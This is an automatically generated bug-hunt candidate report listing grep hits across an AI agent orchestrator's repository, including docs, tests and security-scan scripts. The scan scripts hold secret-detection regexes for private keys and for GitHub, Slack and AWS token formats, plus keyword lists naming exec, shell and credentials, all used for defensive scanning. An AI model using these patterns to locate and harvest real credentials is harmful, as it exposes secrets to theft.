# Active Council Bughunt Candidate Report

This report is not a pass/fail proof. It is a fresh queue of suspicious shapes
that sit outside, or at the edge of, the current closed sweep gates. A green
all-phases council run means registered gates passed; it does not mean these
candidate lines are bugs or that no bugs exist.

Classification rule: any accepted row must be ledgered, fixed with behavior
coverage, sibling-swept, and promoted into a durable gate before closure.

## Async void boundaries

## Silent catch or lossy exception boundaries

## Callback/event invocation boundaries

## Remote/user text in diagnostics or HTTP errors

## Red-team abuse lens
docs/dev/bug-council-active-backlog.md:34:| `Red-team abuse lens` | 0 | Open | Required recurring attacker-view review across secrets, identity, redirects, paths, process launch, and downgrade risks. | Turn accepted hypotheses into behavior tests plus remediation anchors; add preservation tests for normal functionality. |
docs/dev/bug-council-negative-space.md:19:| _replace_with_your_boundary_ | _network input_ | `src/path/to/sink.ext` | `ValidateInputName` |
docs/dev/bug-council-roslyn-analyzers.md:23:| CSL0004 | TaintToFilePath | High | Network-derived file/directory path without sanctioned containment validation. This catches hostile paths before filesystem sinks trust them. |
docs/dev/bug-council-phases.md:8:| 2 | Semantic analyzer beachhead | _Pending / In progress / Done_ | _agent_ | One language-appropriate semantic analyzer (Roslyn / Clippy / ESLint) implementing a taint-to-allocation or taint-to-path lens, with tests. |
docs/dev/bug-council-phases.md:16:| 10 | Additional semantic lens batch | _Pending / In progress / Done_ | _agent_ | Add several distinct semantic lenses in one batch, such as tainted protocol offsets, paths, timeouts, endpoints, enum/status conversions, slice bounds, diagnostic/log-line text, outbound messages, cache keys, crypto trust material, dynamic execution, parser runtimes, resource capacities, and buffer operations, with unit tests and calibration. |
docs/dev/bug-council-scan-registry.md:39:| Untrusted-string-to-path | Find file-system operations on caller-supplied strings without containment. |
docs/dev/bug-council-scan-registry.md:40:| Security-sensitive material | Find high-confidence private keys and token patterns. |
docs/dev/bug-council-scan-registry.md:41:| Red-team abuse lens | Re-check accepted fixes from an attacker viewpoint: spoofed identity, secret disclosure, confused deputy, replay, SSRF/path/process escape, and operational downgrade. |
docs/dev/bug-council-severity-schema.md:12:| Low | Defensive-depth gap: code path is currently unreachable from untrusted input, but the absence of the guard is itself a hazard if a refactor exposes it. |
docs/dev/bug-council-severity-schema.md:15:Pick the **worst plausible** severity given current code paths. If the same code is reachable from two boundaries with different severities, take the higher.
scripts/run-council-active-bughunt.sh:25:    rg -n -U --with-filename --pcre2 --hidden --glob '!.git/**' --glob '!.council/**' "$pattern" "$@" || true
scripts/run-council-active-bughunt.sh:41:# Replace paths and patterns for your repo. Add narrow sections whenever a
scripts/run-council-active-bughunt.sh:61:  '(log|logger|Diagnostic|Console\.WriteLine|StatusCode\(|BadRequest\()[^;\n]*(username|query|filename|directory|token|message)' \
scripts/run-council-active-bughunt.sh:66:  '(token|secret|password|authorization|cookie|api[-_]?key|session|redirect|proxy|forwarded|path|filename|exec|spawn|shell|http://|https://)' \
scripts/check-bug-council-all-phases.sh:26:  printf 'Council all-phases runner is missing or not executable: %s\n' "${runner#$repo_root/}" >&2
scripts/check-council-negative-space.sh:65:#   "src/path/to/sink.ext" \
docs/tui-redesign.md:30:It is simultaneously a run browser, planner, review surface, shell-job monitor, approval inbox, and status board, but none of those feels primary.
docs/tui-redesign.md:36:Runs, plans, sessions, approvals, jobs, review, integrations, and activity all compete in the same visual style.
docs/tui-redesign.md:114:- live execution step cards
docs/tui-redesign.md:131:- budget and tokens
docs/tui-redesign.md:168:- live agent execution
docs/tui-redesign.md:192:- background execution
docs/tui-redesign.md:220:- run/session/plan identity
docs/tui-redesign.md:238:- execution timeline
docs/tui-redesign.md:270:- live execution steps
docs/tui-redesign.md:474:4. Autonomous execution feels observable and governable.
docs/tui-redesign.md:482:- [Shell Mode](shell.md)
tests/test_tui.py:3:from pathlib import Path
tests/test_tui.py:59:    format_session_detail,
tests/test_tui.py:325:        sessions=[],
tests/test_tui.py:326:        session_index=0,
tests/test_tui.py:350:        sessions=[],
tests/test_tui.py:351:        session_index=0,
tests/test_tui.py:374:        sessions=[],
tests/test_tui.py:375:        session_index=0,
tests/test_tui.py:397:        sessions=[],
tests/test_tui.py:398:        session_index=0,
tests/test_tui.py:566:    app.db.create_shell_job(
tests/test_tui.py:573:    app.db.enqueue_shell_job_input(
tests/test_tui.py:579:    job = app.db.get_shell_job("job-1")
tests/test_tui.py:587:        job_events=app.db.list_shell_job_events("job-1"),
tests/test_tui.py:588:        job_inputs=app.db.list_shell_job_inputs(job_id="job-1", status="pending"),
tests/test_tui.py:637:        sessions=[],
tests/test_tui.py:644:        session_index=0,
tests/test_tui.py:722:        sessions=[],
tests/test_tui.py:748:        sessions=[],
tests/test_tui.py:770:        sessions=[],
tests/test_tui.py:774:        mode="sessions",
tests/test_tui.py:792:        sessions=[],
tests/test_tui.py:816:        sessions=[],
tests/test_tui.py:838:        session_count=2,
tests/test_tui.py:859:        "session alpha",
tests/test_tui.py:862:            ("session:aaa", "Alpha Session"),
tests/test_tui.py:866:    assert matches[0][0] == "session:aaa"
tests/test_tui.py:872:        ("session:aaa", "Alpha Session"),
tests/test_tui.py:919:    app.db.create_session(session_id="session-1", title="Daily Session")
tests/test_tui.py:931:    sessions = app.db.list_sessions(limit=5)
tests/test_tui.py:938:        sessions=sessions,
tests/test_tui.py:943:        session_index=0,
tests/test_tui.py:949:        mode="sessions",
tests/test_tui.py:951:        sessions=sessions,
tests/test_tui.py:956:        session_index=0,
tests/test_tui.py:964:        sessions=sessions,
tests/test_tui.py:969:        session_index=0,
tests/test_tui.py:977:        sessions=sessions,
tests/test_tui.py:982:        session_index=0,
tests/test_tui.py:990:        sessions=sessions,
tests/test_tui.py:995:        session_index=0,
tests/test_tui.py:1004:    app.db.create_shell_job(
tests/test_tui.py:1011:    job = app.db.get_shell_job("job-1")
tests/test_tui.py:1032:    app.db.create_shell_job(
tests/test_tui.py:1039:    job = app.db.get_shell_job("job-1")
tests/test_tui.py:1055:def test_format_session_detail_includes_session_runs(tmp_db):
tests/test_tui.py:1057:    app.db.create_session(session_id="session-1", title="Daily Session")
tests/test_tui.py:1063:            metadata={"session_id": "session-1"},
tests/test_tui.py:1066:    session = app.db.get_session("session-1")
tests/test_tui.py:1067:    assert session is not None
tests/test_tui.py:1069:    text = format_session_detail(session, app.db.list_session_runs("session-1"))
tests/test_tui.py:1073:    assert "session runs:" in text
tests/test_tui.py:1075:    assert "session-title <text>" in text
tests/test_tui.py:1134:    app.db.create_shell_job(
tests/test_tui.py:1141:    app.db.enqueue_shell_job_input(
tests/test_tui.py:1147:    job = app.db.get_shell_job("job-1")
tests/test_tui.py:1152:        app.db.list_shell_job_events("job-1"),
tests/test_tui.py:1153:        app.db.list_shell_job_inputs(job_id="job-1", status="pending"),
tests/test_tui.py:1224:    text = format_editor_banner(mode="session-title", context={"session_id": "session-1"})
tests/test_tui.py:1225:    assert "Editing session title" in text
tests/test_tui.py:1226:    assert "session: session-1" in text
tests/test_anthropic.py:39:    backend = AnthropicBackend(model="default-model", api_key="test-key")
tests/test_anthropic.py:53:    backend = AnthropicBackend(model="claude-test", api_key="test-key")
tests/test_anthropic.py:60:                        "input_tokens": 12,
tests/test_anthropic.py:61:                        "cache_read_input_tokens": 3,
tests/test_anthropic.py:73:                        "output_tokens": 7,
tests/test_anthropic.py:74:                        "cache_creation_input_tokens": 2,
tests/test_anthropic.py:85:    assert response.prompt_tokens == 12
tests/test_anthropic.py:86:    assert response.completion_tokens == 7
tests/test_anthropic.py:87:    assert response.total_tokens == 19
tests/test_anthropic.py:88:    assert response.cache_read_tokens == 3
tests/test_anthropic.py:89:    assert response.cache_write_tokens == 2
tests/test_anthropic.py:90:    assert response.metadata["usage"] == {"input_tokens": 12, "output_tokens": 7}
tests/test_anthropic.py:94:def test_run_streaming_falls_back_to_estimated_output_tokens():
tests/test_anthropic.py:95:    backend = AnthropicBackend(model="claude-test", api_key="test-key")
tests/test_anthropic.py:103:    assert response.prompt_tokens == 0
tests/test_anthropic.py:104:    assert response.completion_tokens >= 1
tests/test_anthropic.py:105:    assert response.total_tokens == response.completion_tokens
tests/test_anthropic.py:109:    backend = AnthropicBackend(model="claude-test", api_key="test-key")
tests/test_live_backends.py:4:from pathlib import Path
tests/test_cli_acceptance.py:16:def test_cli_acceptance_run_annotations_and_listing(tmp_db, tmp_path, monkeypatch, capsys):
tests/test_cli_acceptance.py:20:    assert cli.main(["ask", "Acceptance CLI run", "--backend", "mock", "--cwd", str(tmp_path)]) == 0
tests/test_cli_acceptance.py:39:def test_cli_acceptance_session_and_plan_workflow(tmp_db, tmp_path, monkeypatch, capsys):
tests/test_cli_acceptance.py:43:    assert cli.main(["session-new", "Acceptance Session"]) == 0
tests/test_cli_acceptance.py:44:    session = app.db.list_sessions(limit=1)[0]
tests/test_cli_acceptance.py:48:            goal="Seed CLI session history",
tests/test_cli_acceptance.py:50:            working_directory=tmp_path,
tests/test_cli_acceptance.py:51:            metadata={"session_id": session.id},
tests/test_cli_acceptance.py:55:    assert cli.main(["session-compact", session.id, "--limit", "10"]) == 0
tests/test_cli_acceptance.py:56:    assert cli.main(["plan-create", "Acceptance CLI plan", "--backend", "mock", "--cwd", str(tmp_path)]) == 0
scripts/check-remediation-baseline.sh:24:  local path="$1"
scripts/check-remediation-baseline.sh:27:  if [[ -f "$path" ]]; then
scripts/check-remediation-baseline.sh:30:    fail "$label: missing $path"
scripts/check-remediation-baseline.sh:36:  local path="$2"
scripts/check-remediation-baseline.sh:39:  if rg -n -U --pcre2 --hidden --glob '!.git/**' "$pattern" "$path" >/dev/null; then
scripts/check-remediation-baseline.sh:48:  local path="$2"
scripts/check-remediation-baseline.sh:54:  if rg -n -U --pcre2 --hidden --glob '!.git/**' "$pattern" "$path" >"$hit_file" 2>/dev/null; then
scripts/check-remediation-baseline.sh:109:# require_pattern "ValidateInputName" "src/path/to/sink" "input validator wired"
scripts/check-remediation-baseline.sh:110:# require_pattern "MaxRequestSize" "src/path/to/limit" "request size bound declared"
scripts/check-remediation-baseline.sh:113:secret_pattern='-----BEGIN (RSA |DSA |EC |OPENSSH |PGP )?PRIVATE KEY-----|gh[pousr]_[A-Za-z0-9_]{36,}|xox[baprs]-[A-Za-z0-9-]{20,}|AKIA[0-9A-Z]{16}|(?i)(api[_-]?key|access[_-]?token|client[_-]?secret)["'\'']?\s*[:=]\s*["'\''][A-Za-z0-9_./+=-]{24,}["'\'']'
scripts/check-remediation-baseline.sh:114:require_absent_pattern "$secret_pattern" "." "tracked text files do not contain high-confidence secret patterns"
tests/test_api_acceptance.py:31:def test_api_acceptance_run_and_tool_workflow(acceptance_client, tmp_path):
tests/test_api_acceptance.py:39:            "cwd": str(tmp_path),
tests/test_api_acceptance.py:77:        json={"tool_name": "pwd", "cwd": str(tmp_path)},
tests/test_api_acceptance.py:82:    assert payload["output"] == str(tmp_path.resolve())
tests/test_api_acceptance.py:86:def test_api_acceptance_session_and_plan_workflow(acceptance_client, tmp_path):
tests/test_api_acceptance.py:89:    session_response = test_client.post("/sessions", json={"title": "Acceptance Session"})
tests/test_api_acceptance.py:90:    assert session_response.status_code == 200
tests/test_api_acceptance.py:91:    session_id = session_response.json()["session"]["id"]
tests/test_api_acceptance.py:95:            goal="Seed session history",
tests/test_api_acceptance.py:97:            working_directory=tmp_path,
tests/test_api_acceptance.py:98:            metadata={"session_id": session_id},
tests/test_api_acceptance.py:102:    compact_response = test_client.post(f"/sessions/{session_id}/compact", params={"limit": 10})
tests/test_api_acceptance.py:104:    compacted = compact_response.json()["session"]
tests/test_api_acceptance.py:106:    assert "Seed session history" in compacted["context_snapshot"]
tests/test_api_acceptance.py:113:            "cwd": str(tmp_path),
scripts/check-council-sweep-counts.sh:82:#   "secret-pattern sweep count matches scanner"
scripts/scan-bug-council-candidates.sh:24:  rg -n --with-filename --pcre2 --hidden --glob '!.git/**' "$pattern" "$@" || true
scripts/scan-bug-council-candidates.sh:33:  'PRIVATE KEY|gh[pousr]_[A-Za-z0-9_]{36,}|xox[baprs]-[A-Za-z0-9-]{20,}|AKIA[0-9A-Z]{16}|(?i)(api[_-]?key|access[_-]?token|client[_-]?secret)' \
scripts/scan-bug-council-candidates.sh:57:#   'tokio::spawn|select!|timeout\(|sleep\(|interval\(|mpsc|broadcast|oneshot' \
tests/test_cli.py:60:def test_shell_command_uses_app_tool_registry_and_model_override(tmp_db, monkeypatch):
tests/test_cli.py:89:    monkeypatch.setattr(cli, "resolve_alias", lambda alias, backends: ("mock", "shell-model"))
tests/test_cli.py:93:    exit_code = cli.main(["shell", "--model", "smart"])
tests/test_cli.py:98:    assert captured["backend_model"] == "shell-model"
docs/tui-plan.md:19:- the interactive shell
docs/tui-plan.md:22:The shell remains important for fallback and advanced scripting. The TUI becomes the preferred daily-driver operator surface.
docs/tui-plan.md:35:- `src/orchestro/orchestrator.py`: unchanged execution engine
docs/tui-plan.md:65:- session list and session focus
docs/tui-plan.md:75:- pending shell job controls
docs/tui-plan.md:113:The TUI is a viable replacement for the shell for normal daily work.
docs/tui-plan.md:117:The TUI is the best way to operate Orchestro, with the shell reserved for specialist workflows and fallback.
docs/tui-plan.md:146:3. make prompt execution stable
docs/tui-plan.md:147:4. add session and plan awareness
docs/tui-plan.md:160:Reference: [TUI Vision](tui.md), [TUI Redesign Spec](tui-redesign.md), [Shell Mode](shell.md), [Architecture](architecture.md)
tests/test_api.py:162:def test_ask_stream_endpoint_emits_token_and_done_events(client):
tests/test_api.py:169:    assert any("token" in event and "Mock backend response" in event["token"] for event in events)
tests/test_api.py:205:def test_tools_run_endpoint_uses_live_orchestro_tool_registry(client, tmp_path):
tests/test_api.py:213:            "cwd": str(tmp_path),
scripts/check-local-identity-leaks.sh:17:tmp_tokens="$(mktemp)"
scripts/check-local-identity-leaks.sh:20:trap 'rm -f "$tmp_tokens" "$tmp_commits" "$tmp_files"' EXIT
scripts/check-local-identity-leaks.sh:22:add_token() {
scripts/check-local-identity-leaks.sh:23:  local token="$1"
scripts/check-local-identity-leaks.sh:24:  token="${token//$'\n'/}"
scripts/check-local-identity-leaks.sh:25:  token="${token//$'\r'/}"
scripts/check-local-identity-leaks.sh:26:  [[ ${#token} -ge 3 ]] || return 0
scripts/check-local-identity-leaks.sh:27:  case "$token" in
scripts/check-local-identity-leaks.sh:32:  printf '%s\n' "$token" >>"$tmp_tokens"
scripts/check-local-identity-leaks.sh:35:add_token "${LOCAL_IDENTITY_DENYLIST:-}"
scripts/check-local-identity-leaks.sh:36:add_token "${SLSKDN_LOCAL_IDENTITY_DENYLIST:-}"
scripts/check-local-identity-leaks.sh:37:add_token "${SLSKDN_FORBIDDEN_LOCAL_HOSTNAME:-}"
scripts/check-local-identity-leaks.sh:38:add_token "$(hostname -s 2>/dev/null || true)"
scripts/check-local-identity-leaks.sh:39:add_token "${USER:-}"
scripts/check-local-identity-leaks.sh:40:add_token "$(id -un 2>/dev/null || true)"
scripts/check-local-identity-leaks.sh:41:add_token "$(basename "${HOME:-}" 2>/dev/null || true)"
scripts/check-local-identity-leaks.sh:43:read_csv_tokens() {
scripts/check-local-identity-leaks.sh:46:  IFS=',' read -ra tokens <<<"$value"
scripts/check-local-identity-leaks.sh:47:  for token in "${tokens[@]}"; do
scripts/check-local-identity-leaks.sh:48:    add_token "$token"
scripts/check-local-identity-leaks.sh:52:read_csv_tokens "${LOCAL_IDENTITY_DENYLIST:-}"
scripts/check-local-identity-leaks.sh:53:read_csv_tokens "${SLSKDN_LOCAL_IDENTITY_DENYLIST:-}"
scripts/check-local-identity-leaks.sh:58:  while IFS= read -r token; do
scripts/check-local-identity-leaks.sh:59:    [[ "$token" =~ ^[[:space:]]*# ]] && continue
scripts/check-local-identity-leaks.sh:60:    add_token "$token"
scripts/check-local-identity-leaks.sh:67:sort -u "$tmp_tokens" -o "$tmp_tokens"
scripts/check-local-identity-leaks.sh:68:if [[ ! -s "$tmp_tokens" ]]; then
scripts/check-local-identity-leaks.sh:69:  echo "No local identity tokens configured for scanning."
scripts/check-local-identity-leaks.sh:77:  local path="$2"
scripts/check-local-identity-leaks.sh:78:  local display_path="${3:-$path}"
scripts/check-local-identity-leaks.sh:81:  [[ -f "$path" ]] || return 0
scripts/check-local-identity-leaks.sh:83:    rg --json --fixed-strings --ignore-case --file "$tmp_tokens" "$path" |
scripts/check-local-identity-leaks.sh:84:      jq -r --arg label "$label" --arg display_path "$display_path" 'select(.type == "match") | "\($label): \($display_path):\(.data.line_number)"' |
scripts/check-local-identity-leaks.sh:96:  trap 'rm -f "$tmp_tokens" "$tmp_commits" "$tmp_files" "$tmp_unreleased"' EXIT
scripts/check-local-identity-leaks.sh:117:  -path './.git' -prune -o \
scripts/check-local-identity-leaks.sh:118:  -path './node_modules' -prune -o \
scripts/check-local-identity-leaks.sh:119:  -path './vendor' -prune -o \
scripts/check-local-identity-leaks.sh:120:  -path './target' -prune -o \
scripts/check-local-identity-leaks.sh:121:  -path './dist' -prune -o \
scripts/check-local-identity-leaks.sh:122:  -path './build' -prune -o \
scripts/check-local-identity-leaks.sh:123:  -path './zeek/pkg' -prune -o \
scripts/check-local-identity-leaks.sh:125:    -path './.github/release-notes/*' -o \
scripts/check-local-identity-leaks.sh:126:    -path './docs/dev/release-copy.md' -o \
scripts/check-local-identity-leaks.sh:127:    -path './docs/release*.md' -o \
scripts/check-local-identity-leaks.sh:128:    -path './docs/RELEASE*.md' -o \
scripts/check-local-identity-leaks.sh:129:    -path './packaging/winget/*' \
scripts/check-local-identity-leaks.sh:132:while IFS= read -r path; do
scripts/check-local-identity-leaks.sh:133:  [[ -n "$path" ]] || continue
scripts/check-local-identity-leaks.sh:134:  check_file "$path" "$path"
tests/test_lsp_client.py:4:from pathlib import Path
tests/test_lsp_client.py:19:def test_file_uri_produces_correct_uri(tmp_path: Path):
tests/test_lsp_client.py:20:    target = tmp_path / "src" / "main.py"
tests/test_lsp_client.py:28:def test_file_uri_absolute_path():
tests/test_lsp_client.py:168:def test_lsp_manager_load_config_nonexistent_path(tmp_path: Path):
tests/test_lsp_client.py:170:    configs = manager.load_config(tmp_path / "does_not_exist")
tests/test_lsp_client.py:174:def test_lsp_manager_load_config_reads_servers(tmp_path: Path):
tests/test_lsp_client.py:186:    (tmp_path / "lsp_servers.json").write_text(json.dumps(config_data))
tests/test_lsp_client.py:188:    configs = manager.load_config(tmp_path)
tests/test_lsp_client.py:194:def test_lsp_manager_load_config_disabled_not_in_language_map(tmp_path: Path):
tests/test_lsp_client.py:205:    (tmp_path / "lsp_servers.json").write_text(json.dumps(config_data))
tests/test_lsp_client.py:207:    manager.load_config(tmp_path)
tests/test_lsp_client.py:218:def test_lsp_manager_supported_languages_from_config(tmp_path: Path):
tests/test_lsp_client.py:225:    (tmp_path / "lsp_servers.json").write_text(json.dumps(config_data))
tests/test_lsp_client.py:227:    manager.load_config(tmp_path)
tests/test_lsp_client.py:234:def test_lsp_manager_supported_languages_excludes_disabled(tmp_path: Path):
tests/test_lsp_client.py:241:    (tmp_path / "lsp_servers.json").write_text(json.dumps(config_data))
tests/test_lsp_client.py:243:    manager.load_config(tmp_path)
tests/test_lsp_client.py:259:def test_lsp_manager_status_after_config(tmp_path: Path):
tests/test_lsp_client.py:263:    (tmp_path / "lsp_servers.json").write_text(json.dumps(config_data))
tests/test_lsp_client.py:265:    manager.load_config(tmp_path)
tests/test_lsp_client.py:282:def test_lsp_manager_failed_start_goes_to_degraded(tmp_path: Path):
tests/test_lsp_client.py:293:    (tmp_path / "lsp_servers.json").write_text(json.dumps(config_data))
tests/test_lsp_client.py:295:    manager.load_config(tmp_path)
tests/test_lsp_client.py:296:    conn = manager.get_connection("python", str(tmp_path))
docs/tui.md:5:It is not a “nicer shell.” It is the operator cockpit for runs, plans, sessions, approvals, routing, memory, and integrations.
docs/tui.md:25:- sessions and compaction
docs/tui.md:26:- plans and step execution
docs/tui.md:32:The current shell exposes those capabilities, but the operator still has to reconstruct state mentally from command output. A TUI should turn those subsystems into something that is inspectable at a glance.
docs/tui.md:41:- Claude Code sets a high bar for shell-native operability: statuslines, permissions, hooks, MCP, workspace trust, slash commands, and power-user control.
docs/tui.md:50:- Codex: <https://openai.com/index/introducing-upgrades-to-codex/>
docs/tui.md:51:- Claude Code: <https://code.claude.com/docs/en/commands>
docs/tui.md:52:- Cursor CLI: <https://cursor.com/cli>
docs/tui.md:53:- Continue CLI: <https://docs.continue.dev/cli/quickstart>
docs/tui.md:54:- Kilo CLI: <https://kilo.ai/cli>
docs/tui.md:55:- Gemini CLI: <https://github.com/google-gemini/gemini-cli>
docs/tui.md:56:- Aider: <https://aider.chat/>
docs/tui.md:65:- Fast retargeting: backend, model, session, and run focus change instantly.
docs/tui.md:75:- plans and execution cursor
docs/tui.md:137:- left rail: runs, sessions, plans, jobs
docs/tui.md:152:- execution cursor
docs/tui.md:199:- the interface feels distinctive enough that people would prefer it over raw shell output
tests/test_plugins.py:3:from pathlib import Path
tests/test_plugins.py:55:def test_hook_runner_abort_stops_execution():
tests/test_plugins.py:119:def test_plugin_manager_empty_dir_loads_nothing(tmp_path: Path):
tests/test_plugins.py:120:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_plugins.py:135:def test_plugin_manager_loads_plugin_with_register(tmp_path: Path):
tests/test_plugins.py:144:    (tmp_path / "my_plugin.py").write_text(plugin_src)
tests/test_plugins.py:145:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_plugins.py:152:def test_plugin_manager_skips_underscore_files(tmp_path: Path):
tests/test_plugins.py:153:    (tmp_path / "_internal.py").write_text("# internal")
tests/test_plugins.py:154:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_plugins.py:159:def test_plugin_manager_skips_non_py_files(tmp_path: Path):
tests/test_plugins.py:160:    (tmp_path / "README.md").write_text("docs")
tests/test_plugins.py:161:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_plugins.py:166:def test_plugin_manager_plugin_without_metadata_gets_stem_name(tmp_path: Path):
tests/test_plugins.py:168:    (tmp_path / "minimal_plugin.py").write_text(plugin_src)
tests/test_plugins.py:169:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_plugins.py:175:def test_plugin_manager_plugin_without_register_still_loads(tmp_path: Path):
tests/test_plugins.py:176:    (tmp_path / "no_register.py").write_text("x = 42\n")
tests/test_plugins.py:177:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_plugins.py:183:def test_plugin_manager_broken_plugin_is_skipped(tmp_path: Path):
tests/test_plugins.py:184:    (tmp_path / "broken.py").write_text("raise RuntimeError('import error')\n")
tests/test_plugins.py:185:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_plugins.py:191:def test_plugin_manager_hooks_registered_by_plugin_are_runnable(tmp_path: Path):
tests/test_plugins.py:198:    (tmp_path / "gatekeeper.py").write_text(plugin_src)
tests/test_plugins.py:199:    pm = PluginManager(plugins_dir=tmp_path)
tests/test_compaction.py:98:def test_compact_tool_state_summary_captures_file_paths():
tests/test_compaction.py:125:        "tool: read_file\nFixed: corrected the path\nok: True",
tests/test_compaction.py:129:    assert any("corrected the path" in c for c in candidates["corrections"])
tests/test_compaction.py:148:def test_extract_memory_candidates_finds_file_paths():
scripts/launch_tui_first_time.sh:13:# shellcheck disable=SC1091
scripts/launch_tui_first_time.sh:28:exec orchestro tui --backend auto "$@"
tests/test_escalation.py:4:from pathlib import Path
tests/test_escalation.py:24:        channel="shell",
tests/test_escalation.py:33:def test_shell_channel_send(capsys):
tests/test_escalation.py:42:def test_shell_channel_includes_category(capsys):
tests/test_escalation.py:53:def test_file_channel_writes_to_log(tmp_path: Path):
tests/test_escalation.py:54:    log_path = tmp_path / "escalations.log"
tests/test_escalation.py:55:    ch = FileChannel(path=log_path)
tests/test_escalation.py:57:    lines = log_path.read_text().strip().splitlines()
tests/test_escalation.py:63:def test_file_channel_appends_multiple_events(tmp_path: Path):
tests/test_escalation.py:64:    log_path = tmp_path / "escalations.log"
tests/test_escalation.py:65:    ch = FileChannel(path=log_path)
tests/test_escalation.py:68:    lines = log_path.read_text().strip().splitlines()
tests/test_escalation.py:74:def test_file_channel_creates_parent_dirs(tmp_path: Path):
tests/test_escalation.py:75:    log_path = tmp_path / "deep" / "nested" / "escalations.log"
tests/test_escalation.py:76:    ch = FileChannel(path=log_path)
tests/test_escalation.py:78:    assert log_path.exists()
tests/test_escalation.py:86:    ch = WebhookChannel("http://example.com/webhook")
tests/test_escalation.py:98:    ch = WebhookChannel("http://unreachable.local/webhook")
tests/test_escalation.py:111:def test_command_channel_sets_env_vars(tmp_path: Path):
tests/test_escalation.py:112:    sentinel = tmp_path / "env_out.txt"
tests/test_escalation.py:127:def test_load_escalation_config_returns_default_when_no_file(tmp_path: Path):
tests/test_escalation.py:128:    channels = load_escalation_config(tmp_path)
tests/test_escalation.py:133:def test_load_escalation_config_reads_file_channel(tmp_path: Path):
tests/test_escalation.py:134:    log = tmp_path / "my.log"
tests/test_escalation.py:135:    config = {"channels": {"file": {"type": "file", "path": str(log)}}}
tests/test_escalation.py:136:    (tmp_path / "escalation.json").write_text(json.dumps(config))
tests/test_escalation.py:137:    channels = load_escalation_config(tmp_path)
tests/test_escalation.py:142:def test_load_escalation_config_bad_json_returns_default(tmp_path: Path):
tests/test_escalation.py:143:    (tmp_path / "escalation.json").write_text("not json!!!")
tests/test_escalation.py:144:    channels = load_escalation_config(tmp_path)
tests/test_escalation.py:160:def test_escalator_falls_back_to_shell_when_channel_missing(capsys):
tests/test_escalation.py:171:def test_read_escalation_log_empty_when_no_file(tmp_path: Path):
tests/test_escalation.py:172:    entries = read_escalation_log(tmp_path)
tests/test_escalation.py:176:def test_read_escalation_log_returns_entries(tmp_path: Path):
tests/test_escalation.py:177:    log_path = tmp_path / "escalations.log"
tests/test_escalation.py:178:    ch = FileChannel(path=log_path)
tests/test_escalation.py:181:    entries = read_escalation_log(tmp_path)
tests/test_escalation.py:186:def test_read_escalation_log_respects_limit(tmp_path: Path):
tests/test_escalation.py:187:    log_path = tmp_path / "escalations.log"
tests/test_escalation.py:188:    ch = FileChannel(path=log_path)
tests/test_escalation.py:191:    entries = read_escalation_log(tmp_path, limit=3)
scripts/orchestro_canary.py:8:from pathlib import Path
scripts/orchestro_canary.py:35:    parser.add_argument("--goal", default="Reply with a short canary acknowledgement.", help="Goal to execute.")
scripts/orchestro_canary.py:85:        app.execute_prepared_run(prepared)
scripts/orchestro_canary.py:86:    except Exception as exc:  # pragma: no cover - canary is intended for manual execution
docs/database-schema-sql.md:28:    prompt_tokens INTEGER NOT NULL DEFAULT 0,
docs/database-schema-sql.md:29:    completion_tokens INTEGER NOT NULL DEFAULT 0,
docs/database-schema-sql.md:30:    total_tokens INTEGER NOT NULL DEFAULT 0,
docs/database-schema-sql.md:110:CREATE TABLE IF NOT EXISTS shell_jobs (
docs/database-schema-sql.md:127:CREATE TABLE IF NOT EXISTS shell_job_events (
docs/database-schema-sql.md:129:    job_id TEXT NOT NULL REFERENCES shell_jobs(id) ON DELETE CASCADE,
docs/database-schema-sql.md:139:    job_id TEXT REFERENCES shell_jobs(id) ON DELETE CASCADE,
docs/database-schema-sql.md:150:CREATE TABLE IF NOT EXISTS shell_job_inputs (
docs/database-schema-sql.md:152:    job_id TEXT NOT NULL REFERENCES shell_jobs(id) ON DELETE CASCADE,
docs/database-schema-sql.md:204:CREATE TABLE IF NOT EXISTS sessions (
docs/database-schema-sql.md:206:    parent_session_id TEXT REFERENCES sessions(id),
docs/database-schema-sql.md:265:CREATE INDEX IF NOT EXISTS idx_shell_jobs_updated_at ON shell_jobs(updated_at);
docs/database-schema-sql.md:266:CREATE INDEX IF NOT EXISTS idx_shell_job_events_job_id ON shell_job_events(job_id, sequence_no);
docs/database-schema-sql.md:268:CREATE INDEX IF NOT EXISTS idx_shell_job_inputs_job_id ON shell_job_inputs(job_id, status, created_at);
docs/database-schema-sql.md:273:CREATE INDEX IF NOT EXISTS idx_sessions_updated_at ON sessions(updated_at);
docs/database-schema-sql.md:314:    source_path TEXT,
docs/troubleshooting.md:115:### `plan not found` or `session not found`
docs/troubleshooting.md:120:- `orchestro sessions`
tests/test_tools.py:4:from pathlib import Path
tests/test_tools.py:34:def test_unknown_tool_raises(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:36:        registry.run("does_not_exist", "", tmp_path)
tests/test_tools.py:39:def test_confirm_tool_requires_approved(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:41:        registry.run("git_commit", "some message", tmp_path, approved=False)
tests/test_tools.py:48:def test_think_returns_ok(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:49:    result = registry.run("think", "planning next step", tmp_path)
tests/test_tools.py:54:def test_think_truncates_long_input(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:56:    result = registry.run("think", long_input, tmp_path)
tests/test_tools.py:65:def test_pwd_returns_cwd(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:66:    result = registry.run("pwd", "", tmp_path)
tests/test_tools.py:68:    assert result.output == str(tmp_path.resolve())
tests/test_tools.py:71:def test_ls_lists_files(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:72:    (tmp_path / "alpha.txt").touch()
tests/test_tools.py:73:    (tmp_path / "beta.txt").touch()
tests/test_tools.py:74:    (tmp_path / "gamma").mkdir()
tests/test_tools.py:75:    result = registry.run("ls", "", tmp_path)
tests/test_tools.py:82:def test_ls_empty_dir(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:83:    result = registry.run("ls", "", tmp_path)
tests/test_tools.py:88:def test_ls_subdir(registry: ToolRegistry, tmp_path: Path):
tests/test_tools.py:89:    subdir = tmp_path / "sub"
tests/test_tools.py:92:    result = registry.run("ls", "sub", tmp_path)
tests/test_tools.py:101:def test_read_file_returns_content(registry: ToolRegistry, tmp_path: Path):
